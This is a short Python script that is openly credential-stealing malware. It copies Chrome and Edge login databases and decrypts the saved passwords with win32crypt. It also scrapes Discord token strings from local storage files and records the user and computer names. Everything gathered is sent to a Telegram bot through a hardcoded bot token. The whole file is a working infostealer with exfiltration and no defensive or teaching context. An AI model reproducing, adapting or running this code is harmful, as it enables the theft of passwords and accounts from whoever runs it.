import os
import sqlite3
import requests
import tempfile
import shutil
import win32crypt
import json

BOT_TOKEN = "8308368042:AAG23yVzgFo1vjQrBW4_QaOXyIKYrIEuyFg"

def send_telegram(message):
    try:
        updates_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        updates = requests.get(updates_url).json()
        if updates['result']:
            chat_id = updates['result'][-1]['message']['chat']['id']
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {"chat_id": chat_id, "text": message[:4000]}
            requests.post(url, data=data)
    except: pass

def get_discord_tokens():
    tokens = []
    paths = [
        os.getenv('APPDATA') + r'\Discord\Local Storage\leveldb',
        os.getenv('LOCALAPPDATA') + r'\Discord\Local Storage\leveldb'
    ]
    
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(('.ldb', '.log')):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            if 'token' in content.lower():
                                tokens.append(content[content.lower().index('token'):content.lower().index('token')+200])
                    except: pass
    return tokens

def get_browser_passwords():
    passwords = []
    browsers = {
        'Chrome': r'\Google\Chrome\User Data\Default\Login Data',
        'Edge': r'\Microsoft\Edge\User Data\Default\Login Data'
    }
    
    for name, path in browsers.items():
        full_path = os.getenv('LOCALAPPDATA') + path
        if os.path.exists(full_path):
            try:
                temp_file = tempfile.mktemp()
                shutil.copy2(full_path, temp_file)
                conn = sqlite3.connect(temp_file)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pwd in cursor.fetchall():
                    try:
                        password = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1]
                        if password:
                            passwords.append(f"{name}|{url}|{user}|{password.decode('utf-8')}")
                    except: pass
                conn.close()
                os.unlink(temp_file)
            except: pass
    return passwords

if __name__ == "__main__":
    all_data = "=== PC DATA ===\n"
    all_data += f"User: {os.getenv('USERNAME')}\n"
    all_data += f"PC Name: {os.getenv('COMPUTERNAME')}\n\n"
    
    all_data += "DISCORD TOKENS:\n" + "\n".join(get_discord_tokens()) + "\n\n"
    all_data += "BROWSER PASSWORDS:\n" + "\n".join(get_browser_passwords())
    
    send_telegram(all_data)